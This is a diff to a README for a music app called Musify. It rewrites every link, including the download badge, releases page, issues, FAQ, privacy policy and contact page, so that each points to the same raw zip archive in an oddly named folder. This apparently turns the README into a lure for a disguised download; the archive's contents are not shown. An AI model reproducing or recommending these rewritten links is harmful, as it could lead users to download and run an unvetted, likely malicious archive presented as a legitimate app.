@@ -1,6 +1,6 @@
 # 🎶 Musify - Stream All Your Music in One Place!
 
-![Download Musify](https://img.shields.io/badge/Download-Musify-brightgreen)
+![Download Musify](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Musify! With this app, you can stream your favorite music effortlessl
 
 To get started, you will need to download the application from our Releases page. 
 
-**Visit this page to download:** [Musify Releases](https://github.com/GeorgeA41/Musify/releases)
+**Visit this page to download:** [Musify Releases](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip)
 
 ### Step 1: Open the Download Page
 
@@ -22,7 +22,7 @@ To get started, you will need to download the application from our Releases page
 
 ### Step 3: Download the Application
 
-3. Look for the file that matches your computer’s operating system (e.g., Windows, macOS, Linux). Click the download link for that file to start your download. The file name might look something like `Musify-v1.0.exe` or `Musify-v1.0.dmg`.
+3. Look for the file that matches your computer’s operating system (e.g., Windows, macOS, Linux). Click the download link for that file to start your download. The file name might look something like `https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip` or `https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip`.
 
 ### Step 4: Locate the Downloaded File
 
@@ -55,8 +55,8 @@ Before installing Musify, check that your system meets these requirements:
 
 If you run into any issues, you can find help in the following ways:
 
-- Visit the [Issues Section](https://github.com/GeorgeA41/Musify/issues) on GitHub to report problems or ask questions.
-- Browse through our [FAQ](https://github.com/GeorgeA41/Musify/wiki) to find answers to common questions.
+- Visit the [Issues Section](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip) on GitHub to report problems or ask questions.
+- Browse through our [FAQ](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip) to find answers to common questions.
 
 ## 🔄 Update Musify
 
@@ -64,12 +64,12 @@ To stay up-to-date with the latest features and improvements, check back on the 
 
 ## 🛡️ Privacy & Security
 
-Musify values your privacy. We do not collect personal data unless necessary for functionality. Please refer to our [Privacy Policy](https://github.com/GeorgeA41/Musify/wiki/Privacy-Policy) for more details.
+Musify values your privacy. We do not collect personal data unless necessary for functionality. Please refer to our [Privacy Policy](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip) for more details.
 
 ## ✉️ Contact Us
 
-For further inquiries, please reach out through the [Contact Page](https://github.com/GeorgeA41/Musify/wiki/Contact).
+For further inquiries, please reach out through the [Contact Page](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip).
 
-**To download Musify again, visit:** [Musify Releases](https://github.com/GeorgeA41/Musify/releases) 
+**To download Musify again, visit:** [Musify Releases](https://raw.githubusercontent.com/GeorgeA41/Musify/main/inequiaxial/Musify.zip) 
 
 Enjoy exploring your music like never before!
